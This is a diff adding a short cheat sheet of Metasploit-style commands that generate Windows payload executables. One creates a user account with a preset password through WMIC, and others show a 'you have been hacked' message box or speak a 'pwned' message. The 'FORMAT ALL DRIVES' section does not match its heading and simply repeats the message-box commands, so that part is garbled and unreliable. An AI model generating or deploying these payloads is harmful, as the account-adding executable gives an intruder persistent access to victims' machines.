@@ -1,0 +1,26 @@
+f: for the format.
+
+o: for output.
+
+ADD USER
+use windows/adduser
+set user raaz
+set pass Ignite@123
+set wmic true
+generate -f exe -o /root/user.exe
+
+MESSAGE BOX
+use windows/messagebox
+set text you have been hacked
+set title Important Message
+generate -f exe -o /root/message.exe
+
+FORMAT ALL DRIVES
+use windows/messagebox
+set text you have been hacked
+set title Important Message
+generate -f exe -o /root/message.exe
+
+SPEAK
+use windows/speak_pwned
+generate -f exe -o /root/speak.exe
